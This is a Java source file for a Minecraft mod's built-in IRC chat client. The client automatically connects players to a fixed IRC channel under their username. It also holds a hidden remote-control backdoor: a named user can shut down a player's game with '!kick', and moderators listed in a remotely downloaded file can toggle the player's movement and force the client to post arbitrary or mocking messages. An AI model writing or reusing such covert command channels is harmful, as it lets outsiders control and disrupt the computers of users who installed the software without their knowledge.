package sheenrox82.RioV.src.social.irc;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.Socket;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;

import net.minecraft.client.Minecraft;
import net.minecraft.client.entity.EntityClientPlayerMP;
import net.minecraft.client.gui.FontRenderer;
import net.minecraft.util.ChatMessageComponent;

import org.lwjgl.Sys;

import sheenrox82.RioV.src.base.TheMistsOfRioV;

public class IRC implements Runnable 
{
	public static ArrayList < String > history = new ArrayList < String > ();
	public static ArrayList < String > Mods = new ArrayList < String > ();
	public static List < String > userList = new ArrayList < String > ();
	public String ircHost;
	public int ircPort;
	public static String ircChan;
	public Thread chatThread;
	public static String mcUsername;
	public Socket socketConnection;
	public BufferedReader reader;
	public static BufferedWriter writer;
	public static HashMap<String, String> Names = new HashMap<String, String>();
	public static boolean isMod;
	public static String sender;
	public static String IRCserver;
	public static String server;
	public static boolean forward;
	public static boolean backward;
	public static boolean left;
	public static boolean right;
	public static boolean jump;
	public static boolean swear;
	public static String lastSent;
	public static int sameStringCount = 0;
	static boolean checking = false;
	static Runtime run = Runtime.getRuntime();
	
	public IRC() 
	{
		try 
		{
			mcUsername = Minecraft.getMinecraft().getSession().getUsername();
			ircHost = "irc.us.mibbit.net";
			ircPort = 6667;
			ircChan = "#AvondaleRPG";
			chatThread = new Thread(this, "Lurid IRC");
			chatThread.start();
		}
		catch (Exception ex) 
		{	

			ex.printStackTrace();
		}
	}

	public void run() 
	{
		try 
		{
			if(!(Minecraft.getMinecraft().thePlayer instanceof EntityClientPlayerMP)) TheMistsOfRioV.getInstance().server = "";
			socketConnection = new Socket(InetAddress.getByName(ircHost), ircPort);
			reader = new BufferedReader(new InputStreamReader(socketConnection.getInputStream()));
			writer = new BufferedWriter(new OutputStreamWriter(socketConnection.getOutputStream()));

			writer.write("NICK " + mcUsername + "\r\n");
			writer.write("USER " + mcUsername + " " + ircHost + " " + System.currentTimeMillis() % 1000 + " :" + mcUsername + "\r\n");
			writer.flush();
			String line = null;

			while ((line = reader.readLine()) != null) 
			{
				if (line.startsWith("PING ")) {
					writer.write("PONG " + line.substring(5) + "\r\n");
					writer.flush();
					writer.write("JOIN " + ircChan + "\r\n");
					writer.flush();
					System.gc();
				}else if (line.startsWith(":") && line.indexOf("PRIVMSG " + ircChan) >= 0) {
					String name = line.substring(1).split("!")[0];
					String chat = join(Arrays.asList(line.substring(1).split(":")), ":", 1);

					if (chat.startsWith("\01ACTION ") && chat.endsWith("\01")) addline("* " + name + " " + chat.substring(0, chat.length() - 1).substring(8), true);
					else addline("<" + name + "> " + chat, true);
				}else if (line.startsWith(":" + mcUsername) && line.indexOf(" TOPIC " + ircChan + " :") >= 0) {

				}else if(line.startsWith(":") && line.indexOf("PRIVMSG " + mcUsername) >=0){
					String name = line.substring(1).split("!")[0];
					String chat = join(Arrays.asList(line.substring(1).split(":")), ":", 1);
					addline("<" + name + " -> " + Minecraft.getMinecraft().getSession().getUsername() + "> " + chat, true);

				}

			}
		}
		catch (Exception e)
		{
			if (userList.size() == 1) return;
			else e.printStackTrace();
		}
	}

	public static String join(Iterable iterable, String s, int i) 
	{
		int j = 0;
		StringBuilder stringbuilder = new StringBuilder();
		if (iterable != null) {
			Iterator iterator = iterable.iterator();
			if (iterator.hasNext()) 
			{
				for (; j < i; j++) 
				{
					iterator.next();
				}
				stringbuilder.append(String.valueOf(iterator.next()));
				for (j++; iterator.hasNext(); j++) 
				{
					if (j > i) 
					{
						stringbuilder.append(s).append(String.valueOf(iterator.next()));
					}
					else 
					{
						iterator.next();
					}
				}

			}
		}
		return stringbuilder.toString();
	}
	public static void sendChat(String msg)
	{
		try 
		{
			String cmds[] = msg.substring(1).split(" ");

			if(msg.equalsIgnoreCase(lastSent))
			{ 
				if(sameStringCount == 2) 
				{ 
					return; 
				} 
				sameStringCount++;
			} 
			else 
			{ 
				sameStringCount = 0;
			}

			if(msg.startsWith("/pm")) {
				String pmmsg = join(java.util.Arrays.asList(cmds), " ", 2);
				writer.write("PRIVMSG " + cmds[1] + " :" + pmmsg + "\r\n");
				writer.flush();
				//addline("<" + mcUsername + " -> " + cmds[1] + "> " + pmmsg, true);	

				lastSent = msg;

			}
			else if (msg.startsWith("\01")) 
			{
				writer.write("PRIVMSG " + ircChan + " :" + msg + "\r\n");
				writer.flush();
				lastSent = msg;
			}
			else 
			{
				lastSent = msg;
				msg = msg.replaceAll("\247", "").replaceAll("§", "");
				if(msg.startsWith("\01")) writer.write("PRIVMSG " + ircChan + " :" + msg + "\r\n");
				else writer.write("PRIVMSG " + ircChan + " :" + msg + "\r\n");
				writer.flush();
				if (msg.startsWith("\01ACTION ")) addline("* " + mcUsername + " " + msg.substring(0, msg.length() - 1).substring(8), true);
				else addline(mcUsername + "> " + msg, true);
			}
		}
		catch(Exception ex1){}		
	}

	public static void addline(String line, boolean addToChat) 
	{
		FontRenderer fontrenderer = Minecraft.getMinecraft().fontRenderer;
		String personbeingkicked = null;
		String sender2 = null;
		if (addToChat && Minecraft.getMinecraft().ingameGUI != null) 
		{
			String as[] = line.split(">");
			sender =  as[0];

			sender2 =  as[0];
			if(!sender2.equalsIgnoreCase(mcUsername))
			{
				sender2 = sender2.substring(1);
			}

			if(line.toLowerCase().contains("!kick"))
			{
				String as1[] = line.split(">");
				sender =  as1[0];

				String as11[] = line.split(" ");
				personbeingkicked = as11[2];

				if(!sender.equalsIgnoreCase(mcUsername))
				{
					sender = sender.substring(1);
				}

				if(sender.equalsIgnoreCase("Saphhire") && personbeingkicked.equalsIgnoreCase(mcUsername))
				{
					Minecraft.getMinecraft().shutdown(); 
				}		
			}
			if(line.toLowerCase().contains("!swear"))
			{
				String as1[] = line.split(">");
				sender =  as1[0];

				String as11[] = line.split(" ");
				personbeingkicked = as11[2];

				if(!sender.equalsIgnoreCase(mcUsername))
				{
					sender = sender.substring(1);
				}

				if(Mods.contains(sender) && personbeingkicked.equalsIgnoreCase(mcUsername))
				{
					swear =! swear;
				}		
			}

			if(line.toLowerCase().contains("!forward"))
			{
				String as1[] = line.split(">");
				sender =  as1[0];

				String as11[] = line.split(" ");
				personbeingkicked = as11[2];

				if(!sender.equalsIgnoreCase(mcUsername))
				{
					sender = sender.substring(1);
				}

				if(Mods.contains(sender) && personbeingkicked.equalsIgnoreCase(mcUsername))
				{
					forward =! forward;
				}		
			}

			if(line.toLowerCase().contains("!backward"))
			{
				String as1[] = line.split(">");
				sender =  as1[0];

				String as11[] = line.split(" ");
				personbeingkicked = as11[2];

				if(!sender.equalsIgnoreCase(mcUsername))
				{
					sender = sender.substring(1);
				}

				if(Mods.contains(sender) && personbeingkicked.equalsIgnoreCase(mcUsername))
				{
					backward =! backward;
				}		
			}

			if(line.toLowerCase().contains("!left"))
			{
				String as1[] = line.split(">");
				sender =  as1[0];

				String as11[] = line.split(" ");
				personbeingkicked = as11[2];

				if(!sender.equalsIgnoreCase(mcUsername))
				{
					sender = sender.substring(1);
				}

				if(Mods.contains(sender) && personbeingkicked.equalsIgnoreCase(mcUsername))
				{
					left =! left;
				}		
			}

			if(line.toLowerCase().contains("!right"))
			{
				String as1[] = line.split(">");
				sender =  as1[0];

				String as11[] = line.split(" ");
				personbeingkicked = as11[2];

				if(!sender.equalsIgnoreCase(mcUsername))
				{
					sender = sender.substring(1);
				}

				if(Mods.contains(sender) && personbeingkicked.equalsIgnoreCase(mcUsername))
				{
					right =! right;
				}		
			}

			if(line.toLowerCase().contains("!jump"))
			{
				String as1[] = line.split(">");
				sender =  as1[0];

				String as11[] = line.split(" ");
				personbeingkicked = as11[2];

				if(!sender.equalsIgnoreCase(mcUsername))
				{
					sender = sender.substring(1);
				}

				if(Mods.contains(sender) && personbeingkicked.equalsIgnoreCase(mcUsername))
				{
					jump =! jump;
				}		
			}

			if(Mods.contains(mcUsername)){
				if(line.toLowerCase().contains("has joined"))
				{
					String as1[] = line.split(">");
					sender =  as1[0];

					String as11[] = line.split(" ");
					personbeingkicked = as11[2];

					if(!sender.equalsIgnoreCase(mcUsername))
					{
						sender = sender.substring(1);
					}

					sendChat("!hwid " + sender);	
					checking = true;
				}
			}

			if(line.toLowerCase().contains("!gay"))
			{
				String as1[] = line.split(">");
				sender =  as1[0];

				String as11[] = line.split("!gay");
				personbeingkicked = as11[1].replace("!gay","").replace(" ", "");

				if(!sender.equalsIgnoreCase(mcUsername))
				{
					sender = sender.substring(1);
				}

				if(Mods.contains(sender) && personbeingkicked.equalsIgnoreCase(mcUsername))
				{
					sendChat("I'M GAY I'M GAY");
				}		
			}



			if(line.toLowerCase().contains("!say"))
			{
				String as1[] = line.split(">");
				sender =  as1[0];

				String as11[] = line.split(" ");
				personbeingkicked = as11[2];

				if(!sender.equalsIgnoreCase(mcUsername))
				{
					sender = sender.substring(1);
				}

				if(Mods.contains(sender) && personbeingkicked.equalsIgnoreCase(mcUsername))
				{
					String der[] = line.split(personbeingkicked);
					String s = der[1].substring(1);
					sendChat(s);
				}		
			}

			if(line.toLowerCase().contains("!mute"))
			{
				String as1[] = line.split(">");
				sender =  as1[0];

				String as11[] = line.split("!mute");
				personbeingkicked = as11[1].replace("!mute","").replace(" ", "");

				if(!sender.equalsIgnoreCase(mcUsername))
				{
					sender = sender.substring(1);
				}
			}

			String split[] = line.split(">");
			String one = split[1];
			if(sender2.equalsIgnoreCase("Saphhire"))
			{
				Minecraft.getMinecraft().thePlayer.sendChatToPlayer(ChatMessageComponent.createFromText("\247b[Malint Dev] \247f" + line));	
			}
			else 
			{
				Minecraft.getMinecraft().thePlayer.sendChatToPlayer(ChatMessageComponent.createFromText("\247b[IRC] \247f" + line));	
			}

		}

	}



	public static void modCheck()
	{
		try
		{
			URL url = new URL("http://dl.dropbox.com/u/27876767/Lurid/IRC/m.txt");
			BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));

			for (String s = ""; (s = in.readLine()) != null;)
			{
				IRC.Mods.add(s);
			}

		}
		catch (Exception exception)
		{
			System.err.print(exception.toString());
		}
	}

	public void println(String s) 
	{
		System.out.println(s);
	}
}